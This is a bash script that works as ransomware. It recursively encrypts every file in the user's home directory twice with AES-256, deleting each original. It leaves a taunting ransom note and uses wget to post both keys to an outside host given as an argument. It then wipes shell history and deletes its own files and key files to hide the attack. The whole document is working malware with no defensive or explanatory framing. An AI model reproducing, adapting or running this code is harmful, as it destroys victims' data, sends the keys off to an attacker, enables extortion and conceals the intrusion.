#!/bin/bash

if [ -f /tmp/AesKey1.txt ]; then
m=`cat /tmp/AesKey1.txt`
else 
m=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
echo "$m" > /tmp/AesKey1.txt
fi

if [ -f /tmp/AesKey2.txt ]; then
n=`cat /tmp/AesKey2.txt`
else 
n=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
echo "$n" > /tmp/AesKey2.txt
fi

encfile()
{
f=$1
if [[ "$f" != *".aes"* ]]; then 
openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $m
rm $f
fi
p="$1.aes"
if [[ ( "$p" == *".aes"* ) && ( "$p" != *".aes.aes"* ) ]]; then
openssl aes-256-cbc -a -salt -in $p -out $p.aes -k $n
rm $p
fi
}

encdir()
{
	cd $1
	for f in * ; do
	if [ -f "$1/$f" ]; then
	encfile "$1/$f"
	elif [ -d "$1/$f" ]; then
	encdir "$1/$f"
	fi
	done
}

m=`echo ~/`
encdir "$m"
echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
l=`cat /tmp/AesKey1.txt`
m=`cat /tmp/AesKey2.txt`
hd=`echo ~/`
wget --post-data "dir=$hd&Key1=$l&key2=$m" $1 > /dev/null 2>&1
history -c > /dev/null 2>&1
history -w > /dev/null 2>&1
rm post.php
rm ~/.bash_history > /dev/null 2>&1
rm /tmp/base.sh > /dev/null 2>&1
rm /tmp/encrypt.sh > /dev/null 2>&1
rm /tmp/AesKey1.txt > /dev/null 2>&1
rm /tmp/AesKey2.txt > /dev/null 2>&1
